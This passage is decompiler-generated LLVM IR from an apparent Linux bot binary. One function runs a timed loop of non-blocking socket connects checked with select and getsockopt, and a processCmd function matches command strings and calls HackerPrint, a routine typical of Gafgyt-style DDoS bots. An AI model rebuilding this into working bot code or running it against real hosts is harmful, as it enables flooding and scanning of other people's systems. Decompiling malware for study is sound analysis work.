  store i32 %v4_804f0e3, i32* %eax.global-to-local, align 4
  %v0_804f0e8 = load i32, i32* @esp, align 4
  %v2_804f0ee = inttoptr i32 %v0_804f0e8 to i32*
  store i32 0, i32* %v2_804f0ee, align 4
  %v1_804f0f0 = inttoptr i32 %v1_804f0c7 to i32*
  %v2_804f0f0 = call i32 @__GI_time(i32* %v1_804f0f0)
  %v0_804f0f5 = load i32, i32* @esp, align 4
  %v1_804f0f5 = add i32 %v0_804f0f5, 16
  %v5_804f0f8 = add i32 %v2_804f0f0, %arg3
  store i32 %v5_804f0f8, i32* %eax.global-to-local, align 4
  %v3_804f115 = or i32 %v2_804f093, 4
  %v2_804f200 = ptrtoint i32* %stack_var_-196 to i32
  %tmp37 = bitcast i32* %stack_var_-196 to i8*
  %v2_804f254 = ptrtoint i32* %stack_var_-204 to i32
  %v2_804f28e = ptrtoint i32* %stack_var_-208 to i32
  %v2_804f295 = ptrtoint i32* %stack_var_-212 to i32
  %v5_804f3c240 = icmp sgt i32 %v2_804f01a, 1
  br label %dec_label_pc_804f3c8

dec_label_pc_804f10f:                             ; preds = %dec_label_pc_804f3bc.preheader, %dec_label_pc_804f3b9
  %storemerge41 = phi i32 [ %v4_804f3b9, %dec_label_pc_804f3b9 ], [ 0, %dec_label_pc_804f3bc.preheader ]
  store i32 %storemerge41, i32* %eax.global-to-local, align 4
  store i32 %v2_804f093, i32* %edx.global-to-local, align 4
  %v2_804f115 = mul i32 %storemerge41, 8
  %v4_804f115 = add i32 %v2_804f115, %v3_804f115
  %v5_804f115 = inttoptr i32 %v4_804f115 to i8*
  %v6_804f115 = load i8, i8* %v5_804f115, align 4
  %v7_804f115 = zext i8 %v6_804f115 to i32
  %v9_804f115 = and i32 %storemerge41, -256
  %v10_804f115 = or i32 %v7_804f115, %v9_804f115
  store i32 %v10_804f115, i32* %eax.global-to-local, align 4
  store i32 %v7_804f115, i32* %edx.global-to-local, align 4
  %v8_804f126 = icmp eq i8 %v6_804f115, 0
  %v12_804f126 = icmp eq i8 %v6_804f115, 1
  br i1 %v12_804f126, label %dec_label_pc_804f1f6, label %dec_label_pc_804f133

dec_label_pc_804f133:                             ; preds = %dec_label_pc_804f10f
  %v12_804f133 = icmp eq i8 %v6_804f115, 2
  br i1 %v12_804f133, label %dec_label_pc_804f317, label %dec_label_pc_804f140

dec_label_pc_804f140:                             ; preds = %dec_label_pc_804f133
  br i1 %v8_804f126, label %dec_label_pc_804f14e, label %dec_label_pc_804f3b9

dec_label_pc_804f14e:                             ; preds = %dec_label_pc_804f140
  store i32 %storemerge41, i32* @ebx, align 4
  %v0_804f151 = load i32, i32* @esp, align 4
  %v1_804f154 = add i32 %v0_804f151, -8
  %v2_804f154 = inttoptr i32 %v1_804f154 to i32*
  store i32 0, i32* %v2_804f154, align 4
  %v1_804f156 = add i32 %v0_804f151, -12
  %v2_804f156 = inttoptr i32 %v1_804f156 to i32*
  store i32 1, i32* %v2_804f156, align 4
  %v1_804f158 = add i32 %v0_804f151, -16
  %v2_804f158 = inttoptr i32 %v1_804f158 to i32*
  store i32 2, i32* %v2_804f158, align 4
  %v3_804f15a = call i32 @socket(i32 %v7_804f115, i32 %v12_804f000, i32 ptrtoint (i32* @0 to i32))
  %v2_804f167 = load i32, i32* @ebx, align 4
  %v3_804f167 = mul i32 %v2_804f167, 8
  %v4_804f167 = add i32 %v3_804f167, %v2_804f093
  %v5_804f167 = inttoptr i32 %v4_804f167 to i32*
  store i32 %v3_804f15a, i32* %v5_804f167, align 8
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f093, i32* %eax.global-to-local, align 4
  %v3_804f170 = add i32 %v2_804f115, %v2_804f093
  %v4_804f170 = inttoptr i32 %v3_804f170 to i32*
  %v5_804f170 = load i32, i32* %v4_804f170, align 8
  store i32 %v5_804f170, i32* %eax.global-to-local, align 4
  %v0_804f173 = load i32, i32* @esp, align 4
  %v1_804f176 = add i32 %v0_804f173, -8
  %v2_804f176 = inttoptr i32 %v1_804f176 to i32*
  store i32 0, i32* %v2_804f176, align 4
  %v1_804f178 = add i32 %v0_804f173, -12
  %v2_804f178 = inttoptr i32 %v1_804f178 to i32*
  store i32 3, i32* %v2_804f178, align 4
  %v0_804f17a = load i32, i32* %eax.global-to-local, align 4
  %v2_804f17a = add i32 %v0_804f173, -16
  %v3_804f17a = inttoptr i32 %v2_804f17a to i32*
  store i32 %v0_804f17a, i32* %v3_804f17a, align 4
  %v3_804f17b = call i32 @__libc_fcntl(i32 %v7_804f115, i32 %v12_804f000, i32 ptrtoint (i32* @0 to i32))
  %v0_804f180 = load i32, i32* @esp, align 4
  %v12_804f185 = or i32 %v3_804f17b, 2048
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f093, i32* %eax.global-to-local, align 4
  %v5_804f18e = load i32, i32* %v4_804f170, align 8
  store i32 %v5_804f18e, i32* %eax.global-to-local, align 4
  %v2_804f194 = add i32 %v0_804f180, 8
  %v3_804f194 = inttoptr i32 %v2_804f194 to i32*
  store i32 %v12_804f185, i32* %v3_804f194, align 4
  %v1_804f195 = add i32 %v0_804f180, 4
  %v2_804f195 = inttoptr i32 %v1_804f195 to i32*
  store i32 4, i32* %v2_804f195, align 4
  %v0_804f197 = load i32, i32* %eax.global-to-local, align 4
  %v3_804f197 = inttoptr i32 %v0_804f180 to i32*
  store i32 %v0_804f197, i32* %v3_804f197, align 4
  %v3_804f198 = call i32 @__libc_fcntl(i32 %v7_804f115, i32 %v12_804f000, i32 ptrtoint (i32* @0 to i32))
  %v0_804f19d = load i32, i32* @esp, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f093, i32* %eax.global-to-local, align 4
  %v5_804f1a9 = load i32, i32* %v4_804f170, align 8
  store i32 %v5_804f1a9, i32* %eax.global-to-local, align 4
  %v1_804f1af = add i32 %v0_804f19d, 8
  %v2_804f1af = inttoptr i32 %v1_804f1af to i32*
  store i32 16, i32* %v2_804f1af, align 4
  %v2_804f1b1 = add i32 %v0_804f19d, 4
  %v3_804f1b1 = inttoptr i32 %v2_804f1b1 to i32*
  store i32 %v2_804f042, i32* %v3_804f1b1, align 4
  %v0_804f1b2 = load i32, i32* %eax.global-to-local, align 4
  %v3_804f1b2 = inttoptr i32 %v0_804f19d to i32*
  store i32 %v0_804f1b2, i32* %v3_804f1b2, align 4
  %v3_804f1b3 = call i32 @__libc_connect(i32 %v7_804f115, i32 %v12_804f000, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804f1b3, i32* %eax.global-to-local, align 4
  %v0_804f1b8 = load i32, i32* @esp, align 4
  %v1_804f1b8 = add i32 %v0_804f1b8, 16
  %v10_804f1bb = icmp eq i32 %v3_804f1b3, -1
  %v1_804f1be = icmp eq i1 %v10_804f1bb, false
  br i1 %v1_804f1be, label %dec_label_pc_804f1cc, label %dec_label_pc_804f1c0

dec_label_pc_804f1c0:                             ; preds = %dec_label_pc_804f14e
  %v1_804f1c0 = call i32 @__errno_location(i32 %v7_804f115)
  store i32 %v1_804f1c0, i32* %eax.global-to-local, align 4
  %v1_804f1c5 = inttoptr i32 %v1_804f1c0 to i32*
  %v2_804f1c5 = load i32, i32* %v1_804f1c5, align 4
  store i32 %v2_804f1c5, i32* %eax.global-to-local, align 4
  %v9_804f1c7 = icmp eq i32 %v2_804f1c5, 115
  br i1 %v9_804f1c7, label %dec_label_pc_804f1e6, label %dec_label_pc_804f1c0.dec_label_pc_804f1cc_crit_edge

dec_label_pc_804f1c0.dec_label_pc_804f1cc_crit_edge: ; preds = %dec_label_pc_804f1c0
  %v0_804f1d5.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f1cc

dec_label_pc_804f1cc:                             ; preds = %dec_label_pc_804f1c0.dec_label_pc_804f1cc_crit_edge, %dec_label_pc_804f14e
  %v0_804f1d5 = phi i32 [ %v0_804f1d5.pre, %dec_label_pc_804f1c0.dec_label_pc_804f1cc_crit_edge ], [ %v1_804f1b8, %dec_label_pc_804f14e ]
  store i32 %storemerge41, i32* %eax.global-to-local, align 4
  store i32 %v2_804f093, i32* %edx.global-to-local, align 4
  %v5_804f1d2 = load i32, i32* %v4_804f170, align 8
  store i32 %v5_804f1d2, i32* %eax.global-to-local, align 4
  %v2_804f1d8 = add i32 %v0_804f1d5, -16
  %v3_804f1d8 = inttoptr i32 %v2_804f1d8 to i32*
  store i32 %v5_804f1d2, i32* %v3_804f1d8, align 4
  %v1_804f1d9 = call i32 @__libc_close(i32 %v7_804f115)
  store i32 %v1_804f1d9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f3b9

dec_label_pc_804f1e6:                             ; preds = %dec_label_pc_804f1c0
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f093, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_804f115, align 4
  br label %dec_label_pc_804f3b9

dec_label_pc_804f1f6:                             ; preds = %dec_label_pc_804f10f
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804f200, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804f207 = call i8* @_memset(i8* %tmp37, i32 0, i32 32)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f093, i32* %eax.global-to-local, align 4
  %v3_804f215 = add i32 %v2_804f115, %v2_804f093
  %v4_804f215 = inttoptr i32 %v3_804f215 to i32*
  %v5_804f215 = load i32, i32* %v4_804f215, align 8
  %v2_804f21a = udiv i32 %v5_804f215, 32
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f093, i32* %eax.global-to-local, align 4
  %v5_804f223 = load i32, i32* %v4_804f215, align 8
  %v1_804f226 = urem i32 %v5_804f223, 32
  store i32 %v1_804f226, i32* %eax.global-to-local, align 4
  %v0_804f229 = load i32, i32* @ebp, align 4
  %v2_804f229 = mul nuw nsw i32 %v2_804f21a, 4
  %v3_804f229 = add nsw i32 %v2_804f229, -192
  %v4_804f229 = add i32 %v3_804f229, %v0_804f229
  %v5_804f229 = inttoptr i32 %v4_804f229 to i32*
  %v6_804f229 = load i32, i32* %v5_804f229, align 4
  %v9_804f229 = shl i32 1, %v1_804f226
  %v12_804f229 = or i32 %v6_804f229, %v9_804f229
  store i32 %v12_804f229, i32* %v5_804f229, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f093, i32* %eax.global-to-local, align 4
  %v5_804f24b = load i32, i32* %v4_804f215, align 8
  %v1_804f24e = add i32 %v5_804f24b, 1
  store i32 %v1_804f24e, i32* %edx.global-to-local, align 4
  %v0_804f251 = load i32, i32* @esp, align 4
  %v2_804f25a = add i32 %v0_804f251, -16
  %v3_804f25a = inttoptr i32 %v2_804f25a to i32*
  store i32 %v2_804f254, i32* %v3_804f25a, align 4
  %v1_804f25b = add i32 %v0_804f251, -20
  %v2_804f25b = inttoptr i32 %v1_804f25b to i32*
  store i32 0, i32* %v2_804f25b, align 4
  store i32 %v2_804f200, i32* %eax.global-to-local, align 4
  %v2_804f263 = add i32 %v0_804f251, -24
  %v3_804f263 = inttoptr i32 %v2_804f263 to i32*
  store i32 %v2_804f200, i32* %v3_804f263, align 4
  %v1_804f264 = add i32 %v0_804f251, -28
  %v2_804f264 = inttoptr i32 %v1_804f264 to i32*
  store i32 0, i32* %v2_804f264, align 4
  %v0_804f266 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f266 = add i32 %v0_804f251, -32
  %v3_804f266 = inttoptr i32 %v2_804f266 to i32*
  store i32 %v0_804f266, i32* %v3_804f266, align 4
  %v0_804f267 = load i32, i32* %stack_var_-204, align 4
  %v2_804f267 = load i32, i32* %stack_var_-196, align 4
  %v5_804f267 = call i32 @__libc_select(i32 %v0_804f267, i32 10000, i32 %v2_804f267, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804f267, i32* %eax.global-to-local, align 4
  %v0_804f26c = load i32, i32* @esp, align 4
  %v12_804f272 = icmp eq i32 %v5_804f267, 1
  %v1_804f276 = icmp eq i1 %v12_804f272, false
  br i1 %v1_804f276, label %dec_label_pc_804f2e8, label %dec_label_pc_804f278

dec_label_pc_804f278:                             ; preds = %dec_label_pc_804f1f6
  store i32 4, i32* %stack_var_-208, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f093, i32* %eax.global-to-local, align 4
  %v5_804f288 = load i32, i32* %v4_804f215, align 8
  store i32 %v5_804f288, i32* %edx.global-to-local, align 4
  %v2_804f294 = add i32 %v0_804f26c, 16
  %v3_804f294 = inttoptr i32 %v2_804f294 to i32*
  store i32 %v2_804f28e, i32* %v3_804f294, align 4
  store i32 %v2_804f295, i32* %eax.global-to-local, align 4
  %v2_804f29b = add i32 %v0_804f26c, 12
  %v3_804f29b = inttoptr i32 %v2_804f29b to i32*
  store i32 %v2_804f295, i32* %v3_804f29b, align 4
  %v1_804f29c = add i32 %v0_804f26c, 8
  %v2_804f29c = inttoptr i32 %v1_804f29c to i32*
  store i32 4, i32* %v2_804f29c, align 4
  %v1_804f29e = add i32 %v0_804f26c, 4
  %v2_804f29e = inttoptr i32 %v1_804f29e to i32*
  store i32 1, i32* %v2_804f29e, align 4
  %v0_804f2a0 = load i32, i32* %edx.global-to-local, align 4
  %v3_804f2a0 = inttoptr i32 %v0_804f26c to i32*
  store i32 %v0_804f2a0, i32* %v3_804f2a0, align 4
  %v0_804f2a1 = load i32, i32* %stack_var_-208, align 4
  %v1_804f2a1 = load i32, i32* %stack_var_-204, align 4
  %v3_804f2a1 = load i32, i32* %stack_var_-196, align 4
  %v5_804f2a1 = call i32 @getsockopt(i32 %v0_804f2a1, i32 %v1_804f2a1, i32 10000, i32 %v3_804f2a1, i32 ptrtoint (i32* @0 to i32))
  %v0_804f2a6 = load i32, i32* @esp, align 4
  %v3_804f2a9 = load i32, i32* %stack_var_-212, align 4
  %v1_804f2af = icmp eq i32 %v3_804f2a9, 0
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f093, i32* %eax.global-to-local, align 4
  br i1 %v1_804f2af, label %dec_label_pc_804f2d8, label %dec_label_pc_804f2b3

dec_label_pc_804f2b3:                             ; preds = %dec_label_pc_804f278
  %v5_804f2b9 = load i32, i32* %v4_804f215, align 8
  store i32 %v5_804f2b9, i32* %eax.global-to-local, align 4
  %v2_804f2bf = add i32 %v0_804f2a6, 16
  %v3_804f2bf = inttoptr i32 %v2_804f2bf to i32*
  store i32 %v5_804f2b9, i32* %v3_804f2bf, align 4
  %v0_804f2c0 = load i32, i32* %stack_var_-208, align 4
  %v1_804f2c0 = call i32 @__libc_close(i32 %v0_804f2c0)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f093, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804f115, align 4
  br label %dec_label_pc_804f3b9

dec_label_pc_804f2d8:                             ; preds = %dec_label_pc_804f278
  store i8 2, i8* %v5_804f115, align 4
  br label %dec_label_pc_804f3b9

dec_label_pc_804f2e8:                             ; preds = %dec_label_pc_804f1f6
  %v13_804f2e8 = icmp eq i32 %v5_804f267, -1
  %v1_804f2ec = icmp eq i1 %v13_804f2e8, false
  br i1 %v1_804f2ec, label %dec_label_pc_804f3b9, label %dec_label_pc_804f2f2

dec_label_pc_804f2f2:                             ; preds = %dec_label_pc_804f2e8
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f093, i32* %eax.global-to-local, align 4
  %v5_804f2f8 = load i32, i32* %v4_804f215, align 8
  store i32 %v5_804f2f8, i32* %eax.global-to-local, align 4
  %v2_804f2fe = add i32 %v0_804f26c, 16
  %v3_804f2fe = inttoptr i32 %v2_804f2fe to i32*
  store i32 %v5_804f2f8, i32* %v3_804f2fe, align 4
  %v1_804f2ff = call i32 @__libc_close(i32 %v5_804f267)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f093, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804f115, align 4
  br label %dec_label_pc_804f3b9

dec_label_pc_804f317:                             ; preds = %dec_label_pc_804f133
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804f200, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804f328 = call i8* @_memset(i8* %tmp37, i32 0, i32 32)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f093, i32* %eax.global-to-local, align 4
  %v3_804f336 = add i32 %v2_804f115, %v2_804f093
  %v4_804f336 = inttoptr i32 %v3_804f336 to i32*
  %v5_804f336 = load i32, i32* %v4_804f336, align 8
  %v2_804f33b = udiv i32 %v5_804f336, 32
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f093, i32* %eax.global-to-local, align 4
  %v5_804f344 = load i32, i32* %v4_804f336, align 8
  %v1_804f347 = urem i32 %v5_804f344, 32
  store i32 %v1_804f347, i32* %eax.global-to-local, align 4
  %v0_804f34a = load i32, i32* @ebp, align 4
  %v2_804f34a = mul nuw nsw i32 %v2_804f33b, 4
  %v3_804f34a = add nsw i32 %v2_804f34a, -192
  %v4_804f34a = add i32 %v3_804f34a, %v0_804f34a
  %v5_804f34a = inttoptr i32 %v4_804f34a to i32*
  %v6_804f34a = load i32, i32* %v5_804f34a, align 4
  %v9_804f34a = shl i32 1, %v1_804f347
  %v12_804f34a = or i32 %v6_804f34a, %v9_804f34a
  store i32 %v12_804f34a, i32* %v5_804f34a, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f093, i32* %eax.global-to-local, align 4
  %v5_804f36c = load i32, i32* %v4_804f336, align 8
  %v1_804f36f = add i32 %v5_804f36c, 1
  store i32 %v1_804f36f, i32* %edx.global-to-local, align 4
  %v0_804f372 = load i32, i32* @esp, align 4
  %v2_804f37b = add i32 %v0_804f372, -16
  %v3_804f37b = inttoptr i32 %v2_804f37b to i32*
  store i32 %v2_804f254, i32* %v3_804f37b, align 4
  store i32 %v2_804f200, i32* %eax.global-to-local, align 4
  %v2_804f382 = add i32 %v0_804f372, -20
  %v3_804f382 = inttoptr i32 %v2_804f382 to i32*
  store i32 %v2_804f200, i32* %v3_804f382, align 4
  %v1_804f383 = add i32 %v0_804f372, -24
  %v2_804f383 = inttoptr i32 %v1_804f383 to i32*
  store i32 0, i32* %v2_804f383, align 4
  %v1_804f385 = add i32 %v0_804f372, -28
  %v2_804f385 = inttoptr i32 %v1_804f385 to i32*
  store i32 0, i32* %v2_804f385, align 4
  %v0_804f387 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f387 = add i32 %v0_804f372, -32
  %v3_804f387 = inttoptr i32 %v2_804f387 to i32*
  store i32 %v0_804f387, i32* %v3_804f387, align 4
  %v0_804f388 = load i32, i32* %stack_var_-204, align 4
  %v2_804f388 = load i32, i32* %stack_var_-196, align 4
  %v5_804f388 = call i32 @__libc_select(i32 %v0_804f388, i32 10000, i32 %v2_804f388, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804f388, i32* %eax.global-to-local, align 4
  %v4_804f393 = icmp eq i32 %v5_804f388, 0
  br i1 %v4_804f393, label %dec_label_pc_804f3b9, label %dec_label_pc_804f399

dec_label_pc_804f399:                             ; preds = %dec_label_pc_804f317
  %v0_804f38d = load i32, i32* @esp, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f093, i32* %eax.global-to-local, align 4
  %v5_804f39f = load i32, i32* %v4_804f336, align 8
  store i32 %v5_804f39f, i32* %eax.global-to-local, align 4
  %v2_804f3a5 = add i32 %v0_804f38d, 16
  %v3_804f3a5 = inttoptr i32 %v2_804f3a5 to i32*
  store i32 %v5_804f39f, i32* %v3_804f3a5, align 4
  %v1_804f3a6 = call i32 @__libc_close(i32 %v5_804f388)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f093, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804f115, align 4
  br label %dec_label_pc_804f3b9

dec_label_pc_804f3b9:                             ; preds = %dec_label_pc_804f140, %dec_label_pc_804f317, %dec_label_pc_804f2e8, %dec_label_pc_804f2f2, %dec_label_pc_804f2d8, %dec_label_pc_804f2b3, %dec_label_pc_804f1e6, %dec_label_pc_804f1cc, %dec_label_pc_804f399
  %v4_804f3b9 = add nuw nsw i32 %storemerge41, 1
  store i32 %v4_804f3b9, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804f3b9, %v2_804f01c
  br i1 %exitcond, label %dec_label_pc_804f3bc.dec_label_pc_804f3c8.loopexit_crit_edge, label %dec_label_pc_804f10f

dec_label_pc_804f3bc.dec_label_pc_804f3c8.loopexit_crit_edge: ; preds = %dec_label_pc_804f3b9
  %v0_804f3c8.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f3c8

dec_label_pc_804f3c8:                             ; preds = %dec_label_pc_804f3bc.preheader, %dec_label_pc_804f3bc.dec_label_pc_804f3c8.loopexit_crit_edge, %dec_label_pc_804f05d
  %v0_804f3c8 = phi i32 [ %v1_804f0f5, %dec_label_pc_804f05d ], [ %v0_804f3c8.pre.pre, %dec_label_pc_804f3bc.dec_label_pc_804f3c8.loopexit_crit_edge ], [ %v1_804f3d2, %dec_label_pc_804f3bc.preheader ]
  %stack_var_-44.0 = phi i32 [ %tmp10, %dec_label_pc_804f05d ], [ %v2_804f01c, %dec_label_pc_804f3bc.dec_label_pc_804f3c8.loopexit_crit_edge ], [ 0, %dec_label_pc_804f3bc.preheader ]
  %v1_804f3cb = add i32 %v0_804f3c8, -16
  %v2_804f3cb = inttoptr i32 %v1_804f3cb to i32*
  store i32 0, i32* %v2_804f3cb, align 4
  %v1_804f3cd = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_804f3cd = call i32 @__GI_time(i32* %v1_804f3cd)
  store i32 %v2_804f3cd, i32* %eax.global-to-local, align 4
  %v5_804f3d8 = icmp slt i32 %v2_804f3cd, %v5_804f0f8
  br i1 %v5_804f3d8, label %dec_label_pc_804f3bc.preheader, label %dec_label_pc_804f3de

dec_label_pc_804f3bc.preheader:                   ; preds = %dec_label_pc_804f3c8
  %v0_804f3d2 = load i32, i32* @esp, align 4
  %v1_804f3d2 = add i32 %v0_804f3d2, 16
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804f3c240, label %dec_label_pc_804f10f, label %dec_label_pc_804f3c8

dec_label_pc_804f3de:                             ; preds = %dec_label_pc_804f3c8, %entry
  %v0_804f3ea = phi i32 [ %v3_804f04c, %entry ], [ %v2_804f3cd, %dec_label_pc_804f3c8 ]
  %v2_804f3e7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f3e7, i32* @ebx, align 4
  store i32 %v0_804effe, i32* @edi, align 4
  ret i32 %v0_804f3ea

; uselistorder directives
  uselistorder i32 %v4_804f3b9, { 1, 2, 0 }
  uselistorder i32 %v1_804f347, { 1, 0 }
  uselistorder i32 %v0_804f26c, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v5_804f267, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804f226, { 1, 0 }
  uselistorder i32* %v4_804f215, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v0_804f180, { 2, 0, 1 }
  uselistorder i32 %v7_804f115, { 2, 1, 3, 4, 5, 6, 7, 0 }
  uselistorder i8* %v5_804f115, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %storemerge41, { 0, 15, 14, 13, 12, 11, 7, 6, 10, 9, 8, 5, 4, 3, 21, 20, 19, 18, 17, 16, 22, 1, 2 }
  uselistorder i32 %v2_804f200, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_804f0b0, { 1, 0 }
  uselistorder i32 %v2_804f093, { 20, 19, 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 25, 24, 23, 22, 2, 21, 3, 7, 26, 6, 4, 5 }
  uselistorder i32 %v1_804f02a, { 1, 0 }
  uselistorder i32 %v2_804f01c, { 3, 2, 0, 1 }
  uselistorder i32 %v1_804f00e, { 1, 0, 2 }
  uselistorder i32 %v12_804f000, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-196, { 2, 3, 1, 0, 4 }
  uselistorder i32* %stack_var_-204, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %eax.global-to-local, { 53, 44, 43, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 7, 6, 5, 8, 4, 3, 2, 1, 0 }
  uselistorder i32 -24, { 1, 0, 2, 3, 4, 8, 7, 6, 5, 9, 10, 11, 12 }
  uselistorder i32 -20, { 1, 0, 2, 3, 4, 8, 7, 6, 5, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_804f3b9, { 8, 1, 3, 2, 4, 5, 6, 7, 0 }
}

define i32 @processCmd() local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp208 = call i32 @__decompiler_undefined_function_0()
  %tmp224 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-508 = alloca i32, align 4
  %stack_var_-492 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f3ee = load i32, i32* @edi, align 4
  %v0_804f3ef = load i32, i32* @esi, align 4
  %v0_804f3f0 = load i32, i32* @ebx, align 4
  store i32 %v0_804f3f0, i32* %stack_var_-16, align 4
  %v5_804f3f1 = icmp ult i32* %stack_var_-16, inttoptr (i32 428 to i32*)
  store i1 %v5_804f3f1, i1* %cf.global-to-local, align 1
  %v1_804f3fa = inttoptr i32 %tmp224 to i32*
  %v2_804f3fa = load i32, i32* %v1_804f3fa, align 4
  store i1 false, i1* @df, align 1
  %v4_804f417 = inttoptr i32 %v2_804f3fa to i8*
  store i32 %v2_804f3fa, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8058597.21 to i32), i32* @edi, align 4
  %v7_804f429 = call i32 @_strncmp(i8* %v4_804f417, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058597.21, i32 0, i32 0), i32 5)
  %v8_804f429 = urem i32 %v7_804f429, 2
  %v9_804f429 = icmp eq i32 %v8_804f429, 0
  %v0_804f42b = load i1, i1* %cf.global-to-local, align 1
  %v2_804f42b = or i1 %v0_804f42b, %v9_804f429
  %v3_804f42b = zext i1 %v2_804f42b to i32
  %v4_804f42b = load i32, i32* @edx, align 4
  %v5_804f42b = and i32 %v4_804f42b, -256
  %v6_804f42b = or i32 %v3_804f42b, %v5_804f42b
  %v7_804f42b = xor i32 %v6_804f42b, 1
  store i32 %v7_804f42b, i32* %edx.global-to-local, align 4
  %v1_804f433 = trunc i32 %v7_804f42b to i8
  %v3_804f433 = zext i1 %v0_804f42b to i8
  %v15_804f433 = icmp eq i8 %v1_804f433, %v3_804f433
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f43c = icmp eq i1 %v15_804f433, false
  br i1 %v1_804f43c, label %dec_label_pc_804f459, label %dec_label_pc_804f43e

dec_label_pc_804f43e:                             ; preds = %entry
  %v0_804f43e = load i32, i32* @global_var_805d480.20, align 128
  %v0_804f443 = load i32, i32* @esp, align 4
  %v5_804f443 = icmp ult i32 %v0_804f443, 8
  store i1 %v5_804f443, i1* %cf.global-to-local, align 1
  store i32 %v0_804f43e, i32* %stack_var_-460, align 4
  %v3_804f44c = call i32 @HackerPrint(i32 %v0_804f43e, i32 ptrtoint ([6 x i8]* @global_var_805adf9.430 to i32))
  %v0_804f451 = load i32, i32* @esp, align 4
  %v2_804f451 = icmp ugt i32 %v0_804f451, -17
  store i1 %v2_804f451, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050819

dec_label_pc_804f459:                             ; preds = %entry
  %v2_804f45c = load i32, i32* %v1_804f3fa, align 4
  store i1 false, i1* @df, align 1
  %v4_804f479 = inttoptr i32 %v2_804f45c to i8*
  store i32 %v2_804f45c, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_805adff.431 to i32), i32* @edi, align 4
  %v7_804f48b = call i32 @_strncmp(i8* %v4_804f479, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805adff.431, i32 0, i32 0), i32 11)
  %v8_804f48b = urem i32 %v7_804f48b, 2
  %v9_804f48b = icmp eq i32 %v8_804f48b, 0
  %v0_804f48d = load i1, i1* %cf.global-to-local, align 1
  %v2_804f48d = or i1 %v0_804f48d, %v9_804f48b
  %v3_804f48d = zext i1 %v2_804f48d to i32
  %v4_804f48d = load i32, i32* %edx.global-to-local, align 4
  %v5_804f48d = and i32 %v4_804f48d, -256
  %v6_804f48d = or i32 %v3_804f48d, %v5_804f48d
